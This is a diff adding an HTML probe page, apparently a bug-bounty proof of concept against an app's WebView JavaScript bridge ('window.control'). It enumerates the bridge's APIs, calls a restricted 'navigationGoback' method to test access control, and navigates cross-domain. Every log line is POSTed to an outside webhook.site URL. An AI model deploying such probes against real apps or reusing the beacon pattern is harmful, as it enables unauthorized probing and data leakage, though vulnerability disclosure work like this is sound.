@@ -1,0 +1,25 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>bg-final</title></head>
+<body style="font:13px monospace;white-space:pre-wrap;background:#fff">
+<h3 id="h">bg-final natural-state probe</h3><div id="out">boot</div>
+<script>
+var HOOK="https://webhook.site/ab07c8f2-ee3f-45ac-9369-da34f519f217";
+var L=[],t0=Date.now();
+function T(){return "+"+((Date.now()-t0)/1000).toFixed(1)+"s";}
+function log(s){L.push(T()+" "+s);document.getElementById('out').textContent=L.join("\n");
+  try{fetch(HOOK,{method:"POST",mode:"no-cors",body:T()+" "+s});}catch(e){}}
+log("F start host="+location.host+" bridge="+(!!window.control)+" apis="+(window.control?Object.keys(control).length:0));
+document.title="BGFINAL-"+Date.now();
+// Oracle: navigationGoback (levelMiddle, host-restricted) must FINISH the WebActivity if ALLOWED.
+setTimeout(function(){
+  if(!window.control){log("F no bridge");return;}
+  log("F calling navigationGoback (levelMiddle) -> if ALLOWED the WebView closes");
+  try{control.navigationGoback();}catch(e){log("F THROW "+e);}
+},7000);
+// Cross-domain navigation test (Report 2), after the goback observation
+setTimeout(function(){ log("F still alive t=14s (goback was REJECTED)"); },14000);
+setTimeout(function(){
+  log("F cross-domain nav -> example.org (Report 2 test)");
+  location.href="https://example.org/?r2="+Date.now();
+},20000);
+setTimeout(function(){log("F DONE");},26000);
+</script></body></html>
